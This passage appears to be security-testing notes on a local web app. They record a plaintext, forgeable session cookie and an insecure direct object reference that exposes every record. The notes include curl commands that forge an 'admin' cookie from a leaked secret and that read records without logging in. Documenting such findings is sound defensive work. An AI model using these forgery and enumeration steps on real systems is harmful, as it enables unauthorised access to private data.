Session cookie analysis ⚠️⚠️ CRITICAL FINDING

Logged in and inspected the Set-Cookie header:

curl -X POST http://localhost:8080/login -d "username=svc-rep&password=trustno1" -c cookies.txt -v
...
Set-Cookie: session=svc-rep:dev-secret-change-me; Path=/

The session cookie is literally username:secret in PLAIN TEXT — no encryption, no signing, no randomness. The "secret" (dev-secret-change-me) is the exact same value leaked earlier by /debug. This means:

Session cookies are forgeable by anyone who has the leaked secret (which is public via /debug)
No HttpOnly / Secure / SameSite flags set either — cookie readable by JS, sent over plain HTTP

Tested forging a cookie for "admin" with no password at all:

curl http://localhost:8080/record/1 -H "Cookie: session=admin:dev-secret-change-me"

Result inconclusive at first (record 1 doesn't exist) — see IDOR section below for why this almost doesn't even matter: auth isn't checked at all on /record.

Tested cookie against /login itself:

curl -X POST http://localhost:8080/login -H "Cookie: session=admin:dev-secret-change-me"
→ {"ok": false}

Confirms /login ignores existing cookies entirely — it only checks explicit username/password. Cookie forgery would need to be tested against routes that CHECK an existing session, not the login route itself.

/record/<id> — IDOR CONFIRMED ⚠️⚠️ CRITICAL FINDING

Tested all three real IDs with NO session at all, and again with svc-rep (admin) cookie attached:

curl http://localhost:8080/record/1001            → {"note": "Payroll summary Q3", "owner": "alice"}
curl http://localhost:8080/record/1001 -b cookies.txt → same result, identical
curl http://localhost:8080/record/1002            → {"note": "Supplier contract - Northwood", "owner": "bob"}
curl http://localhost:8080/record/1003            → {"note": "Board pack draft", "owner": "admin"}

Result: IDENTICAL response with and without authentication. Confirms:

/record/<id> performs NO authentication check whatsoever
NO ownership check either — any session (or none) can read ANY record regardless of owner
Classic Insecure Direct Object Reference (IDOR): the app trusts the ID in the URL completely
Every record in the system (including admin's board pack) is exposed to anyone who can guess/enumerate sequential IDs — no login, no exploit, no cracking required
